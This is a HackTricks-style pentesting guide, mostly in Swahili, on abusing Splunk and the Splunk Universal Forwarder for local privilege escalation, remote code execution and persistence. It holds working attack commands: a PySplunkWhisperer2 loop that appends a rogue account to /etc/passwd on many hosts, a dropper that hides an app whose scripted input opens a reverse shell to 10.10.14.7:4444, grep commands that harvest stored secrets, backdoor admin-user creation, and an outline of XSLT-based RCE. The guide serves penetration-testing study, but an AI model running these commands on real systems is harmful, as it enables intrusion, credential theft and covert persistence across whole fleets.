# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Ikiwa ukiwa **unafanya enumeration** ya mashine **internally** au **externally** unagundua **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), valid credentials mara nyingi zinaweza kugeuzwa kuwa **code execution** kupitia app installation, scripted inputs, au management actions. Ikiwa Splunk inaendeshwa kama **root**, hilo mara nyingi huwa **privilege escalation** ya haraka.

Ikiwa unahitaji tu generic remote attack surface, enumeration, au app-upload RCE path, angalia:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ikiwa tayari uko **root** na Splunk service haisikilizi tu kwenye localhost, unaweza pia kuiba **Splunk password hashes**, kurecover **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.

## Interesting Local Files

Unapofika kwenye host inayokimbiza Splunk au Splunk Universal Forwarder, hizi kwa kawaida ndizo paths za kuvutia zaidi:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifak muhimu:

- **`$SPLUNK_HOME/etc/passwd`**: watumiaji wa ndani wa Splunk na heshi za nenosiri.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ufunguo unaotumiwa na Splunk kusimba siri zilizohifadhiwa kwenye faili kadhaa za `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya kuanzisha admin; muhimu kwenye gold images na makosa ya provisioning. Haizingatiwi ikiwa `etc/passwd` tayari ipo.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwashwa mara nyingi.
- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: maeneo mazuri ya kuficha app ya kudumu au kukagua kile ambacho tayari kinagawanywa.

## Muhtasari wa Exploit ya Splunk Universal Forwarder Agent

Kwa maelezo zaidi angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu:

**Muhtasari wa exploit:**
Exploit inayolenga Splunk Universal Forwarder (UF) inaruhusu washambuliaji wenye **agent password** kutekeleza code yoyote kwenye mifumo inayoendesha agent, na hivyo kuweza kuhatarisha sehemu kubwa ya mazingira.

**Kwa nini inafanya kazi:**

- Huduma ya usimamizi ya UF mara nyingi hufichuliwa kwenye **TCP 8089**.
- Washambuliaji wanaweza kujithibitisha kwa API na kuagiza forwarder isakinishe **malicious app bundle**.
- Primitive hiyo hiyo inaweza kutumiwa ndani kwa **LPE** au kwa mbali kwa **RCE**.
- Zana za umma kama **SplunkWhisperer2** huunda app bundle kiotomatiki na zinaweza kurekebisha payloads kwa malengo ya Linux.

**Njia za kawaida za kurejesha nenosiri:**

- Credentials za wazi kwenye nyaraka, scripts, shares, au deployment automation.
- Password hashes ndani ya `$SPLUNK_HOME/etc/passwd` kisha kufuatiwa na offline cracking.
- Golden images au mabaki ya provisioning kama `user-seed.conf`.

**Athari:**

- Utekelezaji wa code wa kiwango cha SYSTEM/root kwenye kila host iliyoathiriwa.
- Uwekaji wa apps za kudumu, backdoors, au ransomware.
- Kuzima au kuharibu telemetry kabla ya data kutumwa.

**Amri ya mfano ya kutekeleza exploit:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit za umma zinazoweza kutumika:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence kupitia Scripted Inputs au Malicious Apps

Ikiwa una **filesystem write access** kama `root`/`splunk`, au authenticated access ya kusanidi apps, njia ya persistence inayotegemewa sana ni kuweka **custom app** yenye **scripted input**. Nyaraka za Splunk zenyewe zinatarajia scripted inputs ziwe chini ya saraka ya app na ziwezeshwe kutoka `inputs.conf`.

Mpangilio wa kawaida:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper ya haraka ya Linux:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- Mbinu ileile inafanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.
- Washambulizi mara nyingi hujichanganya kwa kurekebisha add-on halali badala ya kuunda app iliyo waziwazi kuwa ya kishetani.
- Kwenye **deployment server**, kupanda app ya kishetani ndani ya `deployment-apps/` hubadilika kuwa **fleet-wide persistence** kwa sababu forwarders hupiga poll, hupakua apps zilizosasishwa, na mara nyingi huanzisha upya ili kuzitumia.

## Credential Theft and Admin Takeover

Ukiweza kusoma faili za ndani za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.

### Password hashes and local users

Splunk huhifadhi data ya local authentication kwenye `etc/passwd`. Kulingana na deployment, kuvunja file hiyo kunaweza kurejesha credentials zinazofanya kazi kwa web UI na management API.

Ikiwa tayari una valid **admin** credentials na Splunk inatumia **native** authentication backend, CLI yenyewe inaweza kutumika kwa persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` and encrypted values

Splunk hutumia `etc/auth/splunk.secret` kulinda thamani nyeti zilizohifadhiwa kwenye faili nyingi za usanidi. Ukifanikiwa kuiba **secret** na faili husika za **`.conf`**, mara nyingi unaweza kurejesha au ku-replay:

- forwarder/indexer shared secrets kama `pass4SymmKey`
- TLS private-key passwords kama `sslPassword`
- LDAP bind credentials kama `bindDNPassword`

Hii ni muhimu kwa **lateral movement** hata kama nenosiri la Splunk admin lenyewe haliwezi kuvunjwa.

### `user-seed.conf` abuse

`user-seed.conf` hutumiwa tu wakati wa start ya kwanza au wakati `etc/passwd` haipo. Hilo linaifanya isiwe na manufaa sana kwenye box linaloishi, lakini inavutia sana katika:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances ambapo Splunk huanzishwa upya kiotomatiki

Katika hali hizo, kupanda `HASHED_PASSWORD` iliyotengenezwa kwa `splunk hash-passwd` hukupa njia tulivu ya kupata tena admin access baada ya redeployment.

## Abusing Splunk Queries

Kwa maelezo zaidi angalia [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Mbinu muhimu ya karibuni ni kutumia vibaya **user-supplied XSLT** katika matoleo dhaifu ya Splunk Enterprise ili kubadilisha account iliyothibitishwa yenye privilege ndogo kuwa **OS command execution** kama user `splunk`.

High-level flow:

1. Authenticate to Splunk.
2. Upload a malicious **XSL** file kupitia preview/upload functionality.
3. Fanya Splunk irender search results kwa stylesheet hiyo iliyopakiwa kutoka kwenye directory ya **dispatch**.
4. Tumia XSLT payload kuandika faili au kuchochea execution kupitia Splunk's search pipeline (kwa mfano kwa kufikia internal functionality kama `runshellscript`).

The important offensive takeaway is that this path is **post-auth RCE without needing app upload**. On Linux it usually lands you in the **`splunk`** account, which is still valuable because that user often owns the application tree, can read secrets, and can plant persistent apps that survive shell loss.

A representative path used during exploitation is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Kama Splunk inafanya kazi na privileges nyingi sana, au kama mtumiaji `splunk` ana access ya dangerous scripts, writable service units, au `sudo` rules mbaya, hili linakuwa chain safi ya **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
